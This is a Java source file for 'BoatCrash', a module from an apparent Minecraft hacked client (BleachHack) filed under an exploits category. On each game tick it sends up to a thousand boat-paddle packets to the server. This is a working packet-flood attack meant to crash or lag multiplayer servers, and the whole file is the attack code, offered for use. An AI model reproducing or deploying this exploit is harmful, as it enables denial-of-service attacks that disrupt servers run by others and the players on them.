package bleach.hack.module.mods;

import com.google.common.eventbus.Subscribe;

import bleach.hack.event.events.EventTick;
import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.server.network.packet.BoatPaddleStateC2SPacket;

/** @author Bleach **/
public class BoatCrash extends Module {

	public BoatCrash() {
        super("BoatCrash", -1, Category.EXPLOITS, "Boat packet exploit, similar to bookcrash",
                new SettingSlider("Uses: ", 1,1000,100,0));
    }
	
	@Subscribe
	public void onTick(EventTick event) {
		for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new BoatPaddleStateC2SPacket(true, true));
		}
	}

}
